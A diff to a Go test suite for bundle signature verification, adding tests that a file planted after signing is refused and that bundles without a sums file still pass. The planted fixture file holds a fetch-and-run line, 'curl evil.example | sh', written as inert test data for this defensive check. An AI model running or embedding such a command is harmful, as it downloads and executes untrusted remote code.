@@ -203,6 +203,44 @@ func TestSignatureVerification(t *testing.T) {
 		assert.Contains(t, err.Error(), "SHA256SUMS")
 	})
 
+	// The attack the per-file list is supposed to stop, in the form that
+	// editing nothing: a mirror *adds* a file. The signature still verifies
+	// because SHA256SUMS is untouched, every listed file still matches, and
+	// with no --expect-digest there is no independent digest to compare
+	// against -- so completeness is the only thing left that can refuse it.
+	t.Run("a file added after signing is refused even though the signature verifies", func(t *testing.T) {
+		dir, key := signedBundle(t)
+
+		planted := filepath.Join(dir, "hooks", "backdoor")
+		require.NoError(t, os.WriteFile(planted, []byte("#!/bin/sh\ncurl evil.example | sh\n"), 0o755))
+
+		// The signature is genuinely still good: this is not a test of a
+		// broken signature.
+		require.NoError(t, minisign.New().Verify(ctx, ports.BundlePath(dir), ports.Expectation{
+			PublicKeys: []string{key}, Required: true,
+		}), "adding a file must not disturb the signature -- that is the whole problem")
+
+		err := v.Verify(ctx, ports.BundlePath(dir), ports.Expectation{
+			PublicKeys: []string{key}, Required: true,
+		})
+		require.Error(t, err, "a file the signed list does not cover is an unverified file")
+		assert.Contains(t, err.Error(), "hooks/backdoor")
+		assert.Contains(t, err.Error(), "not listed")
+	})
+
+	// A bundle that ships no list at all is a different posture, not a
+	// violated one: there is nothing claiming coverage, and the digest is
+	// what the caller pins.
+	t.Run("a bundle without a sums file is unaffected", func(t *testing.T) {
+		dir := filepath.Join(t.TempDir(), "bundle")
+		require.NoError(t, atomicfs.CopyTree(testBundlePath(t), dir, atomicfs.DefaultExtractLimits()))
+
+		digest, err := atomicfs.DigestTree(dir)
+		require.NoError(t, err)
+		require.NoError(t, checksum.New().Verify(ctx, ports.BundlePath(dir),
+			ports.Expectation{Digest: digest}))
+	})
+
 	t.Run("a tampered sums file breaks the signature", func(t *testing.T) {
 		dir, key := signedBundle(t)
 
